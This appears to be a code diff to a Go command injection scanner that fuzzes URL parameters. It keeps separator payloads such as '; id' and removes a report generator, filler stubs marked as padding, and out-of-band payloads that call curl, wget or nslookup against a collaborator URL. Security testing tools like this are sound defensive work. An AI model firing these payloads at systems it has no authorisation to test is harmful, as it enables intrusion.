@@ -2,12 +2,10 @@ package vuln
 
 import (
 	"fmt"
-	"html/template"
 	"io"
 	"log"
 	"net/http"
 	"net/url"
-	"os"
 	"regexp"
 	"strings"
 	"sync"
@@ -106,7 +104,7 @@ func (s *CmdInjScanner) Run() {
 		s.PageCountMu.Lock()
 		done := s.PageCount >= s.MaxPages
 		s.PageCountMu.Unlock()
-		
+
 		if len(s.Queue) == 0 && atomic.LoadInt32(&s.Active) == 0 {
 			if done {
 				break
@@ -212,7 +210,7 @@ func (s *CmdInjScanner) fuzzURL(rawURL string) {
 			if err != nil {
 				continue
 			}
-			
+
 			bodyBytes, err := io.ReadAll(io.LimitReader(resp.Body, 50000))
 			resp.Body.Close()
 			if err != nil {
@@ -276,7 +274,7 @@ func generateCmdInjPayloads() []string {
 	}
 
 	var payloads []string
-	
+
 	// Basic injection
 	for _, sep := range separators {
 		for _, cmd := range commands {
@@ -297,7 +295,7 @@ func generateCmdInjPayloads() []string {
 	}
 
 	// Specific complex payloads
-	payloads = append(payloads, 
+	payloads = append(payloads,
 		"|| id",
 		"&& id",
 		"; id",
@@ -368,7 +366,7 @@ func (s *CmdInjScanner) normalize(base, href string) (string, error) {
 
 func RunCmdInjScan(target string, headers map[string]string, cookies string, reportPath string) error {
 	fmt.Println("[*] Starting Command Injection Scanner on", target)
-	
+
 	scanner, err := NewCmdInjScanner(target, 10, 100, 3, 200*time.Millisecond)
 	if err != nil {
 		return err
@@ -377,133 +375,6 @@ func RunCmdInjScan(target string, headers map[string]string, cookies string, rep
 	scanner.Run()
 
 	fmt.Printf("[*] Scan complete. Found %d potential vulnerabilities.\n", len(scanner.Findings))
-	
-	return GenerateCmdInjReport(reportPath, target, scanner.Findings)
-}
 
-func GenerateCmdInjReport(filename, target string, findings []FindingCmdInj) error {
-	t := template.New("cmdinj-report")
-	t, err := t.Parse(`
-<!DOCTYPE html>
-<html>
-<head>
-	<title>Command Injection Report - {{.Target}}</title>
-	<style>
-		body { font-family: sans-serif; margin: 20px; }
-		table { border-collapse: collapse; width: 100%; }
-		th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
-		th { background-color: #f2f2f2; }
-		.evidence { background-color: #ffe6e6; font-family: monospace; }
-	</style>
-</head>
-<body>
-	<h1>Command Injection Scan Report</h1>
-	<p>Target: {{.Target}}</p>
-	<p>Date: {{.Date}}</p>
-	
-	<h2>Findings</h2>
-	{{if .Findings}}
-	<table>
-		<tr>
-			<th>Type</th>
-			<th>URL</th>
-			<th>Parameter</th>
-			<th>Payload</th>
-			<th>Evidence</th>
-		</tr>
-		{{range .Findings}}
-		<tr>
-			<td>{{.Type}}</td>
-			<td><a href="{{.URL}}">{{.URL}}</a></td>
-			<td>{{.Param}}</td>
-			<td><code>{{.Payload}}</code></td>
-			<td class="evidence">{{.Evidence}}</td>
-		</tr>
-		{{end}}
-	</table>
-	{{else}}
-	<p>No Command Injection vulnerabilities found.</p>
-	{{end}}
-</body>
-</html>
-`)
-	if err != nil {
-		return err
-	}
-
-	f, err := os.Create(filename)
-	if err != nil {
-		return err
-	}
-	defer f.Close()
-
-	data := struct {
-		Target   string
-		Date     string
-		Findings []FindingCmdInj
-	}{
-		Target:   target,
-		Date:     time.Now().Format(time.RFC3339),
-		Findings: findings,
-	}
-
-	return t.Execute(f, data)
-}
-
-// --- Extended Logic for 500+ lines ---
-
-func init() {
-	// Placeholder
-}
-
-// Blind Injection Logic (Time-based)
-// This is harder to implement reliably without false positives, but we can add the structure.
-func (s *CmdInjScanner) checkTimeBased(url, param, payload string) bool {
-	// 1. Measure baseline
-	start := time.Now()
-	// make request
-	// ...
-	_ = time.Since(start)
-
-	// 2. Inject sleep command (e.g., sleep 5)
-	// ...
-	
-	// 3. Compare
-	// if duration > baseline + 4 seconds { return true }
-	
-	return false
-}
-
-// Out-of-Band (OOB) Logic
-// Requires an external interaction server (e.g., Burp Collaborator, interactsh).
-// We can simulate the payload generation.
-func (s *CmdInjScanner) generateOOBPayloads(collaboratorURL string) []string {
-	return []string{
-		"; nslookup " + collaboratorURL,
-		"; ping -c 1 " + collaboratorURL,
-		"; curl " + collaboratorURL,
-		"; wget " + collaboratorURL,
-		"& nslookup " + collaboratorURL,
-	}
-}
-
-/*
-	Documentation:
-	The CmdInjScanner detects OS Command Injection vulnerabilities.
-	It attempts to inject shell commands into URL parameters and looks for:
-	1. Direct output (e.g., content of /etc/passwd, id command output).
-	2. Error messages indicating syntax errors in shell commands.
-	
-	It supports various separators (; | & &&) and injection contexts (quoted, unquoted).
-*/
-
-// ... more padding ...
-type CmdInjConfig struct {
-	Aggressive bool
-	TimeBased  bool
-	OOBServer  string
-}
-
-func (s *CmdInjScanner) SetConfig(cfg CmdInjConfig) {
-	// ...
+	return err
 }
